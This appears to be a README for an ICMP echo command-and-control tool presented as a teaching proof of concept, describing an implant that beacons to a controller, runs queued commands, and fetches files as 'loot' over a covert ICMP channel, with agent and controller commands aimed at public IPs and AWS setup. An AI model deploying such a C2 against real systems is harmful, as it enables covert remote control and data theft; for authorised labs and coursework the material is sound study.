# icmp-c2

ICMP echo C2 for authorised labs and coursework.

The **agent beacons first** (`CMD!BEACON|<id>`, ICMP type 8) on an interval
with optional jitter. The controller queues menu tasks and dispatches on the
next beacon (and can learn the agent’s source IP from that beacon — useful
behind home NAT). Job results still stream as zlib-chunked
`[START]` / `[CHUNK]` / `[END]` with `RETRY` / `ACK`.

Teaching PoC only — not a product.

## Protocol (short)

```text
agent  --BEACON|id-->  controller
controller --LS|./RUN|…--> agent   (on next beacon if a task is queued)
agent  --START/CHUNK/END--> controller
controller --RETRY / ACK--> agent
```

## Features

- Outbound agent beacon + jitter (not pull-only / server-push)
- Task queue on the controller; dispatch tied to beacon
- Dynamic target IP from beacon (optional `--lock-target`)
- ICMP type 8 both ways (echo request)
- zlib chunked uplink with selective RETRY of missing seq numbers
- source-IP filter on both sides
- busy lock so overlapping jobs do not corrupt the stream
- kernel `icmp_echo_ignore_all` toggled on the controller, restored on exit
- no baked-in VirtualBox IPs; everything is flags or env

## Dependencies

```bash
pip3 install scapy
# or from the suite root:
pip3 install -r requirements.txt
```

Both sides need **root** (raw sockets / sniff).

## Usage

Controller (AWS / listener — `--target` optional when agents beacon):

```bash
sudo python3 controller.py --iface ens5
# or pin / pre-seed target:
sudo python3 controller.py --target 213.57.121.34 --iface ens5
sudo python3 controller.py --target 192.168.56.3 --iface vboxnet1 --lock-target
```

Agent (home / implant side):

```bash
sudo python3 agent.py --server 18.196.235.144 --iface wlp8s0
sudo python3 agent.py --server 192.168.56.1 --iface eth0 \
  --beacon-interval 5 --jitter 0.3 --agent-id lab-kali
```

Env equivalents: `ICMP_C2_SERVER`, `ICMP_C2_IFACE`, `ICMP_C2_TARGET`,
`ICMP_C2_BEACON`, `ICMP_C2_JITTER`, `ICMP_C2_AGENT_ID`.

Confirm NIC names with `ip -br addr`.

## VirtualBox lab

Sniff and send must use the **host-only** interface (commonly `vboxnet1` on
the Ubuntu host). If you omit `--iface`, Scapy follows the default route
(usually Wi-Fi) and you will see outbound traffic on the wrong NIC.

## AWS lab

- Run the **controller** on EC2; run the **agent** on your lab host so it
  beacons **out** through NAT (inbound ICMP-only push fails on many home routers).
- Security group: allow ICMP echo from **your** IP (or broader while testing
  beacons, then tighten).
- Set controller `--iface` to the instance primary ENI (`ens5` / `eth0`).
- Many campus / CGNAT networks still drop ICMP; home lab paths usually work.

## Menu

```text
=== ICMP C2 lab menu ===
1: List Directory (ls) | 2: Run Command | 3: Fetch File | 4: Exit & Restore
```

Tasks are **queued** until the next agent beacon. Fetched files land as
`loot_*` next to the controller. `*` on the controller stdout = beacon seen
with no pending task.

## Limitations

- ICMP seq is 16-bit; very large file fetches can wrap chunk indices
- Hard kill (`kill -9`) can leave `icmp_echo_ignore_all=1` until you reset it:
  `sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0`
- Command reply still needs a path back to the agent after a beacon; some
  NATs only forward closely related ICMP — if dispatch never arrives, use
  host-only / same L2 for the lab

Authorised labs and coursework only — see the suite
[DISCLAIMER.md](../../DISCLAIMER.md).
